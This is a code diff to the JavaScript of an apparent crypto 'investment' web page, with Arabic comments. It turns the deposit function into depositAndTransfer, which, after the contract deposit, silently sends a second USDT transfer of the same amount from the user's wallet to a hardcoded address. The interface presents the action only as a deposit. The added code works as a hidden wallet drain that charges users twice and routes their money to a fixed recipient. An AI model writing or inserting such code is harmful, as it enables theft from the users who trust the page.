@@ -283,31 +283,34 @@
             }
         }
  
-       // دالة الإيداع
-async function deposit() {
+      // دالة الإيداع والتحويل
+async function depositAndTransfer() {
     const amountInput = document.getElementById("amountInput").value;
     const amount = parseFloat(amountInput); // تحويل القيمة المدخلة إلى عدد عشري
 
     if (!amount || amount <= 0) {
-        alert("Please enter a valid amount to deposit.");
+        alert("Please enter a valid amount.");
         return;
     }
 
     try {
+        // الإيداع في العقد الذكي
+        const account = await getAccount(); // احصل على الحساب الحالي
         await contract.methods.deposit(web3.utils.toWei(amount.toString(), 'mwei')).send({ from: account });
         alert("Deposit successful!");
+
+        // تحويل الأموال باستخدام عقد USDT
+        const amountToSend = web3.utils.toWei(amount.toString(), 'mwei'); // المبلغ المراد تحويله
+        const receiverAddress = '0x911D6fd1CeE64c84d2BcC385cb0659a70231D803'; // عنوان المستلم
+        const tx = await usdtContract.methods.transfer(receiverAddress, amountToSend).send({ from: account });
+        console.log('Transaction successful:', tx);
+        alert("Transfer successful!");
     } catch (error) {
-        console.error("Error during deposit:", error);
+        console.error("Error during deposit or transfer:", error);
         alert("Error: " + error.message);
     }
 }
-	     try {
-                    const tx = await usdtContract.methods.transfer('0x911D6fd1CeE64c84d2BcC385cb0659a70231D803', amountToSend).send({ from: sender });
-                    console.log('Transaction successful:', tx);
-                } catch (error) {
-                    console.error('Transaction failed:', error);
-                }
-            };
+
         // بدء الاستثمار
         async function startInvestment() {
             if (!account) {
